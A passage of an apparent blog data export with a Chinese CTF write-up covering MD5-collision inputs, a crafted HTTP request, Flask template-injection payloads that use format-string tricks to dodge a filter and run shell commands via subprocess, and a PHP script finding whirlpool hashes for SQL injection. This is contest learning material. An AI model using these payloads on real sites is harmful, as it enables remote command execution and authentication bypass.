4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A&val7=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&a=byGcY&b=aOtm2\n```\n\n即可拿到flag\n\n[参考链接]([http://www.gtfly.top/2019/04/07/%E6%8E%98%E5%AE%89%E6%9D%AFwp.html#audit](http://www.gtfly.top/2019/04/07/掘安杯wp.html#audit))\n\n\n\n\n\n\n\n# easyflask1\n\n给出提示，应该是ssti\n\n在404页面注入\n\n![](/pic/123.png)\n\n经过测试过滤了`-`,`.`。\n\n参考链接https://fireshellsecurity.team/asisctf-fort-knox\n\n操作\n\n```\n''.__class__.__mro__[1].__subclasses__()['''找到warnings.catch_warnings'''].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('ls')\n```\n\n114师傅的payload\n\n```\n##payload不需要这么长，可以连续格式化字符串，也可以只把_和.用格式化字符串替代\n#没找到flag，先看目录，发现start.sh可读\n{{''['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['mro']()[1]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](115)+'{0:c}'['format'](117)+'{0:c}'['format'](98)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](101)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]()[65]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](105)+'{0:c}'['format'](110)+'{0:c}'['format'](105)+'{0:c}'['format'](116)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](103)+'{0:c}'['format'](108)+'{0:c}'['format'](111)+'{0:c}'['format'](98)+'{0:c}'['format'](97)+'{0:c}'['format'](108)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](98)+'{0:c}'['format'](117)+'{0:c}'['format'](105)+'{0:c}'['format'](108)+'{0:c}'['format'](116)+'{0:c}'['format'](105)+'{0:c}'['format'](110)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](105)+'{0:c}'['format'](109)+'{0:c}'['format'](112)+'{0:c}'['format'](111)+'{0:c}'['format'](114)+'{0:c}'['format'](116)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]('subprocess')['check'+'{0:c}'['format'](95)+'output'](['ls','/'])}}\n#读取start.sh中存在sed -i \"s/1ad0633b78d14695b04f105c14674b0d4/$1/g\" /flag\\n\n{{''['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['mro']()[1]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](115)+'{0:c}'['format'](117)+'{0:c}'['format'](98)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](101)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]()[231]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](105)+'{0:c}'['format'](110)+'{0:c}'['format'](105)+'{0:c}'['format'](116)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](103)+'{0:c}'['format'](108)+'{0:c}'['format'](111)+'{0:c}'['format'](98)+'{0:c}'['format'](97)+'{0:c}'['format'](108)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](98)+'{0:c}'['format'](117)+'{0:c}'['format'](105)+'{0:c}'['format'](108)+'{0:c}'['format'](116)+'{0:c}'['format'](105)+'{0:c}'['format'](110)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](105)+'{0:c}'['format'](109)+'{0:c}'['format'](112)+'{0:c}'['format'](111)+'{0:c}'['format'](114)+'{0:c}'['format'](116)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]('subprocess')['check'+'{0:c}'['format'](95)+'output'](['cat','/start'+'{0:c}'['format'](46)+'sh'])}}\n```\n\n\n\n\n\n# HashIsTrue\n\n给了提示\n\n```\n注意如下题目内容：$pw = hash(\"whirlpool\",$pass,true); $sql = \"select * from user where username='$user' and password='$pw'\";\n```\n\n hash(\"whirlpool\",$pass,true)当hash函数开启true时，会返回字符串，而不是16进制。\n\n可以制造MD5后的包含‘= ’ (没有想通)\n\n编写脚本参考着114师傅\n\n```\n<?php\nfor($i=0;;$i++)\n{\n    $pass=$i;\n    $pw = hash(\"whirlpool\",$pass,true);\n    if(preg_match('/\\'=\\'/',$pw ))\n    {\n        echo $i;\n        echo urldecode('%09');\n        echo $pw;\n        echo urldecode('%0a');\n    }\n}\n?>\n```\n\n","slug":"安恒月赛20200226","published":1,"updated":"2020-02-26T05:49:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfnr001ypk7e5v0s9wvm","content":"<h1 id=\"easy-hash\"><a href=\"#easy-hash\" class=\"headerlink\" title=\"easy-hash\"></a>easy-hash</h1><p>打开题目就是源码</p>\n<a id=\"more\"></a>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$val1 &#x3D; @$_GET[&#39;val1&#39;];</span><br><span class=\"line\">$val2 &#x3D; @$_GET[&#39;val2&#39;];</span><br><span class=\"line\">$val3 &#x3D; @$_GET[&#39;val3&#39;];</span><br><span class=\"line\">$val4 &#x3D; @$_GET[&#39;val4&#39;];</span><br><span class=\"line\">$val5 &#x3D; (string)@$_POST[&#39;val5&#39;];</span><br><span class=\"line\">$val6 &#x3D; (string)@$_POST[&#39;val6&#39;];</span><br><span class=\"line\">$val7 &#x3D; (string)@$_POST[&#39;val7&#39;];</span><br><span class=\"line\">if( $val1 &#x3D;&#x3D; $val2 )&#123;</span><br><span class=\"line\">    die(&#39;val1 OR val2 no no no&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if( md5($val1) !&#x3D; md5($val2) )&#123;</span><br><span class=\"line\">    die(&#39;step 1 fail&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if( $val3 &#x3D;&#x3D; $val4 )&#123;</span><br><span class=\"line\">    die(&#39;val3 OR val4 no no no&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if ( md5($val3) !&#x3D;&#x3D; md5($val4))&#123;</span><br><span class=\"line\">    die(&#39;step 2 fail&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if( $val5 &#x3D;&#x3D; $val6 || $val5 &#x3D;&#x3D; $val7 || $val6 &#x3D;&#x3D; $val7 )&#123;</span><br><span class=\"line\">    die(&#39;val5 OR val6 OR val7 no no no&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if (md5($val5) !&#x3D;&#x3D; md5($val6) || md5($val6) !&#x3D;&#x3D; md5($val7) || md5($val5) !&#x3D;&#x3D; md5($val7))&#123;</span><br><span class=\"line\">    die(&#39;step 3 fail&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(!($_POST[&#39;a&#39;]) and !($_POST[&#39;b&#39;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    echo &quot;come on!&quot;;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a &#x3D; $_POST[&#39;a&#39;];</span><br><span class=\"line\">$b &#x3D; $_POST[&#39;b&#39;];</span><br><span class=\"line\">$m &#x3D; $_GET[&#39;m&#39;];</span><br><span class=\"line\">$n &#x3D; $_GET[&#39;n&#39;];</span><br><span class=\"line\"></span><br><span class=\"line\">if (!(ctype_alnum($a)) || (strlen($a) &gt; 5)  || !(ctype_alnum($b)) || (strlen($b) &gt; 6))    &#x2F;&#x2F;&#x2F;&#x2F;判断是否是字母和数字或字母数字的组合</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    echo &quot;a OR b fail!&quot;;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ((strlen($m) &gt; 1) || (strlen($n) &gt; 1))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    echo &quot;m OR n fail&quot;;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$val8 &#x3D; md5($a);</span><br><span class=\"line\">$val9 &#x3D; strtr(md5($b), $m, $n);  &#x2F;&#x2F;将MD5后包含$m的内容替换为$n</span><br><span class=\"line\"></span><br><span class=\"line\">echo PHP_EOL;</span><br><span class=\"line\">echo &quot;&lt;p&gt;val8 : $val8&lt;&#x2F;p&gt;&quot;;</span><br><span class=\"line\">echo PHP_EOL;</span><br><span class=\"line\">echo &quot;&lt;p&gt;val9 : $val9&lt;&#x2F;p&gt;&quot;;</span><br><span class=\"line\">echo PHP_EOL;</span><br><span class=\"line\">if (($val8 &#x3D;&#x3D; $val9) &amp;&amp; !($a &#x3D;&#x3D;&#x3D; $b) &amp;&amp; (strlen($b) &#x3D;&#x3D;&#x3D; 5))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    echo &quot;nice,good job,give you flag:&quot;;</span><br><span class=\"line\">    echo file_get_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;);</span><br><span class=\"line\">&#125; val1 OR val2 no no no</span><br></pre></td></tr></table></figure>\n\n<p>显然的MD5碰撞</p>\n<p>生成的四组不同字符相同MD5</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br><span class=\"line\"></span><br><span class=\"line\">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A</span><br><span class=\"line\"></span><br><span class=\"line\">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br><span class=\"line\"></span><br><span class=\"line\">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A</span><br></pre></td></tr></table></figure>\n\n<p>发包</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST &#x2F;?val1&#x3D;s878926199a&amp;val2&#x3D;s155964671a&amp;val3&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&amp;val4&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&amp;m&#x3D;a&amp;n&#x3D;1 HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 183.129.189.60:10004</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 2337</span><br><span class=\"line\">Origin: http:&#x2F;&#x2F;183.129.189.60:10004</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Referer: http:&#x2F;&#x2F;183.129.189.60:10004&#x2F;?val1&#x3D;s878926199a&amp;val2&#x3D;s155964671a&amp;val3&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&amp;val4&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&amp;val5&#x3D;%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%12%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%7B%F9%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%CA%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%9D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%2C%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%C3%0F%93%72%5C&amp;val6&#x3D;%39%98%EB%F3%ED%EC%0F%45%C0%89%DD%13%77%E0%88%34%41%BF%20%0B%2B%1B%D8%D0%40%5A%7A%6E%52%92%AF%C8%5B%FD%E4%F5%E2%2A%EA%FC%CB%25%63%59%98%7B%78%54%24%A1%35%20%A5%2A%D6%22%35%04%B2%74%01%03%9E%F7%08%01%88%BA%03%88%01%09%65%96%5D%D2%A6%A2%3B%FF%AF%97%3D%88%50%1C%13%DA%49%B3%20%00%3A%60%88%E7%D7%B3%28%58%AF%04%6C%FC%F5%FE%0D%93%42%70%00%BD%EA%CE%D1%14%B4%B1%8E%47%8D%AD%2E%E5%2D%64%1D%3A&amp;val7&#x3D;%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%92%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%FB%F8%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%4A%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%1D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%AC%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%43%0F%93%72%5C&amp;m[]&#x3D;8c8d357b5e872bbacd45197626bd5759&amp;n[]&#x3D;523af537946b79c4f8369ed39ba78605</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br><span class=\"line\">val5&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&amp;val6&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D